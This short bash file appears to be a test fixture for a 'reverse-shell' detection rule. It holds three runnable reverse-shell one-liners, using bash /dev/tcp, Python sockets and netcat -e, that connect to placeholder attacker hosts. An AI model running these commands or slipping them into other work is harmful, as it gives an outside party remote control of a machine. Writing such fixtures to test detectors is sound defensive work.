#!/bin/bash
# Reverse shell — should trigger rule: reverse-shell

# Classic bash reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat reverse shell
nc -e /bin/sh attacker.com 4444
